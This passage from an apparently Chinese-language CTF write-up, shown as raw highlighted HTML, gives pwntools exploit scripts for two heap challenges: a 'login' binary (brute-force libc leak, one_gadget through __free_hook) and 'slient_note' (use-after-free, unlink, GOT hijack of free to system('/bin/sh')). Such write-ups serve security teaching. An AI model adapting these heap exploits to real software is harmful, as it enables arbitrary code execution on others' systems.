point_one <span class="token operator">=</span> chr<span class="token punctuation">(</span>i<span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0x1</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    login<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>chr<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span>point_one<span class="token operator">+</span><span class="token string">"\x7f"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"success!"</span> <span class="token keyword">in</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        point_two <span class="token operator">=</span> chr<span class="token punctuation">(</span>i<span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0x1</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0x1</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        login<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">+</span>chr<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span>chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span>point_two<span class="token operator">+</span>point_one<span class="token operator">+</span><span class="token string">"\x7f"</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"success!"</span> <span class="token keyword">in</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            flag <span class="token operator">=</span> <span class="token number">1</span>            point_three <span class="token operator">=</span> chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span>            point_four <span class="token operator">=</span> chr<span class="token punctuation">(</span>i<span class="token punctuation">)</span>            p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"You password is:\n"</span><span class="token punctuation">)</span>            date <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># print hex(date)</span>            <span class="token keyword">break</span>libc_base <span class="token operator">=</span> date<span class="token number">-65</span><span class="token operator">-</span><span class="token number">0x3C4B20</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>步骤二：修改新chunk pass（实际也是旧chunk的manage chunk）pass_addr为一个地址（地址中的数据不变且已知），func pointer放入one_gadget</strong></p><pre class="line-numbers language-python"><code class="language-python">one_gadget <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0xf02a4</span>create<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__free_hook"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>login<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x05-exp-1"><a href="#0x05-exp-1" class="headerlink" title="0x05 exp"></a>0x05 exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level  <span class="token operator">=</span>  <span class="token string">"debug"</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./login"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc-2.23.so"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./login"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Choice:\n"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"id:\n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"length:\n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"password:\n"</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Choice:\n"</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"id:\n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"length:\n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"password:\n"</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Choice:\n"</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"id:\n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Choice:\n"</span><span class="token punctuation">,</span><span class="token string">"4"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"id:\n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"new pass:\n"</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x80</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0x1</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    login<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>chr<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\x7f"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"success!"</span> <span class="token keyword">in</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        point_one <span class="token operator">=</span> chr<span class="token punctuation">(</span>i<span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0x1</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    login<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>chr<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span>point_one<span class="token operator">+</span><span class="token string">"\x7f"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"success!"</span> <span class="token keyword">in</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        point_two <span class="token operator">=</span> chr<span class="token punctuation">(</span>i<span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0x1</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0x1</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        login<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">+</span>chr<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span>chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span>point_two<span class="token operator">+</span>point_one<span class="token operator">+</span><span class="token string">"\x7f"</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"success!"</span> <span class="token keyword">in</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            flag <span class="token operator">=</span> <span class="token number">1</span>            point_three <span class="token operator">=</span> chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span>            point_four <span class="token operator">=</span> chr<span class="token punctuation">(</span>i<span class="token punctuation">)</span>            p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"You password is:\n"</span><span class="token punctuation">)</span>            date <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># print hex(date)</span>            <span class="token keyword">break</span>libc_base <span class="token operator">=</span> date<span class="token number">-65</span><span class="token operator">-</span><span class="token number">0x3C4B20</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span>one_gadget <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0xf02a4</span>create<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__free_hook"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>login<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="slient-note"><a href="#slient-note" class="headerlink" title="slient_note"></a>slient_note</h1><h2 id="0x01-查看文件-2"><a href="#0x01-查看文件-2" class="headerlink" title="0x01 查看文件"></a>0x01 查看文件</h2> <div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/30/2019-shang-hai-shi-da-xue-sheng-xin-xi-an-quan-jing-sai/10.png"></div> 肯定是跟两者有关：bss段数据，hijacking GOT**考察点：** unlink，hijacking GOT<h2 id="0x02-IDA分析-2"><a href="#0x02-IDA分析-2" class="headerlink" title="0x02 IDA分析"></a>0x02 IDA分析</h2><p> 创建</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/30/2019-shang-hai-shi-da-xue-sheng-xin-xi-an-quan-jing-sai/11.png"></div> 两种chunk，第一种是：0x30，第二种是0x210删除<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/30/2019-shang-hai-shi-da-xue-sheng-xin-xi-an-quan-jing-sai/12.png"></div> UAF漏洞编辑<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/30/2019-shang-hai-shi-da-xue-sheng-xin-xi-an-quan-jing-sai/13.png"></div> 对应的chunk进行修改。<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/30/2019-shang-hai-shi-da-xue-sheng-xin-xi-an-quan-jing-sai/14.png"></div><h2 id="0x03-思路-2"><a href="#0x03-思路-2" class="headerlink" title="0x03 思路"></a>0x03 思路</h2><p> unlink攻击：<br> </p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/30/2019-shang-hai-shi-da-xue-sheng-xin-xi-an-quan-jing-sai/15.png"></div><p></p><p> 步骤一：unlink攻击</p><pre class="line-numbers language-python"><code class="language-python">create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"\x22"</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"\x11"</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"\x11"</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"\x11"</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>target_addr<span class="token number">-0x18</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>target_addr<span class="token number">-0x10</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x210</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 改本身已经为0x1e0size 的chunk为0x210，以便直接分配个chunk，large chunk指针指向这个位置进行unlink</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"\x22"</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>              <span class="token comment" spellcheck="true"># unlink att</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>步骤二：hijacking GOT</p><pre class="line-numbers language-python"><code class="language-python">edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x6020a0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"free"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>data <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> data <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"_IO_2_1_stdout_"</span><span class="token punctuation">]</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token operator">+</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"/bin/sh\n"</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x04-exp"><a href="#0x04-exp" class="headerlink" title="0x04 exp"></a>0x04 exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level  <span class="token operator">=</span>  <span class="token string">"debug"</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 1: small chunk 0x28(0x30), 2:  large chunk 0x208(0x210)</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Exit\n"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"add?\n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"Content:\n"</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Exit\n"</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"2.Large\n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"4.Exit\n"</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Large\n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Content:\n"</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span>target_addr <span class="token operator">=</span> <span class="token number">0x6020d0</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"\x22"</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"\x11"</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># create(1,"\x11"*0x10+"\n")</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"\x11"</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>target_addr<span class="token number">-0x18</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>target_addr<span class="token number">-0x10</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x210</span><span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"\x22"</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x6020a0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"free"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>data <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> data <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"_IO_2_1_stdout_"</span><span class="token punctuation">]</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token operator">+</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"/bin/sh\n"</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span 